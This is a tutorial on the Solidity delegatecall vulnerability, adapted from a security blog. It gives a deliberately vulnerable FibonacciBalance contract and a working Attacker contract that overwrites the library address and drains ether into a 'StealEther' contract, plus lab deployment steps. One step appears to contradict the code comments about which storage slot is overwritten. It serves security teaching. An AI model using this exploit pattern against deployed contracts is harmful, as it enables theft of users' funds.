Delegatecall Vulnerability

There are two kinds of low level functions invocations: call() and delegatecall(). The latter is used when we wish to execute an external function in the context of the caller contract. This means the target function can manipulate the state variables of the caller contract. So, if contract A issues a delegatecall to B.foo(), then foo() will have access to state variables in A and run as if it is one of A's functions. The way this works is that solidity stores state variables in slots in the order the variables appear in the contract. For example, and we are going to avoid complexities here, if a contract A has three state variables( say uint A; uint B; uint C;), they will be assigned slot0, slot1 and slot2 respectively. So regardless of the state variable names contract B uses, if B.foo() changes the value of B's first state variable (i.e. slot0 in contract B), it will change the value stored in slot0 of contract A (i.e. uint A in contract A). This behaviour introduces vulnerabilities when we use delegatecall() instead of call() for external function invocations. 

To make them work with the Solidity v0.8.10 compiler, I upgraded the FibonacciLib and FibonacciBalance contracts provided at https://github.com/sigp/solidity-security-blog#4-delegatecall-1. I have provided below an Attacker contract that exploits this delegatecall() vulnerability and another contract StealEther that simply stores the stolen funds.

How to run:
1. Deploy StealEther contract, copy the address where it is deployed
2. Go to Attacker contract and paste this address in fallback()
3. Deploy FibonacciLib, copy the address
4. Deploy FibonacciBalance with 100 wei and supply FibonacciLib's address to the constructor
5. Deploy Attacker contract and provide FibonacciBalance's contract address to the constructor
6. Invoke StealEther.tellBalance() - should return 0 wei
7. Invoke Attacker.changeTargetAddress()
	7.1 Check the value of FibonacciBalance.calculatedFibNumber - it should now store the address of Attacker contract
8. Invoke Attacker.callWithdraw()
9. Check the value of StealEther.tellBalance() - Should show 100 wei


// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

// library contract - calculates fibonacci-like numbers;
contract FibonacciLib 
{    
    // initializing the standard fibonacci sequence;
    uint public start;
    uint public calculatedFibNumber;

    // modify the zeroth number in the sequence
    function setStart(uint _start) public 
    {
        start = _start;
    }

    function setFibonacci(uint n) public 
    {
        calculatedFibNumber = fibonacci(n);
    }

    function fibonacci(uint n) internal returns (uint) 
    {
        if (n == 0) return start;
        else if (n == 1) return start + 1;
        else return fibonacci(n - 1) + fibonacci(n - 2);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

contract FibonacciBalance 
{
    address public fibonacciLibrary;
    // the current fibonacci number to withdraw
    uint public calculatedFibNumber;
    // the starting fibonacci sequence number
    uint public start = 3;
    uint public withdrawalCounter;
    // the fibonancci function selector
    //bytes4 constant fibSig = bytes4(keccak256("setFibonacci(uint256)"));
    string constant fibSig = "setFibonacci(uint256)";
    
    // constructor - loads the contract with ether
    constructor(address _fibonacciLibrary) payable 
    {
        fibonacciLibrary = _fibonacciLibrary;
    }

    function withdraw() public 
    {
        withdrawalCounter += 1;
        // calculate the fibonacci number for the current withdrawal user
        // this sets calculatedFibNumber
        fibonacciLibrary.delegatecall(abi.encodeWithSignature(fibSig, withdrawalCounter));
        payable(msg.sender).transfer(calculatedFibNumber * 1 wei);
    }
    
    // allow users to call fibonacci library functions
    fallback() external 
    {
        fibonacciLibrary.delegatecall(msg.data);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

// Our exploit
contract Attacker
{
    address target;

    uint public slot1;
    
    constructor(address _target)
    {
        target = _target;
    }

    // To override the contract address fibonacciLibrary is pointing to in the FibonacciBalance contract
    // and make it point to our StealEther contract instead
    function changeTargetAddress() public
    {
        target.call(abi.encodeWithSignature("setStart(uint256)", uint256(uint160(address(this)))));
    }

    // Invoke FibonacciBalance.withdraw() to force it to call Attacker.fallback() 
    function callWithdraw() public
    {
        target.call(abi.encodeWithSignature("withdraw()"));
    }

    // Steal the moolah
    fallback() external payable
    {
        // Couldn't understand why this does not work
        // payable(msg.sender).transfer(address(this).balance);
        
        // Less elegant than the one above but, money is money
        // 0xaE036c65C649172b43ef7156b009c6221B596B8b is the address of StealEther contract
        payable(address(0xaE036c65C649172b43ef7156b009c6221B596B8b)).transfer(address(this).balance);
    }

    // For debugging purpose
    function tellBalance() view public returns (uint)
    {
        return address(this).balance;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

// Save stolen funds
contract StealEther
{
    // Accept the stolen Ether
    fallback() external payable{}

    function tellBalance() view public returns (uint)
    {
        return address(this).balance;
    }
}
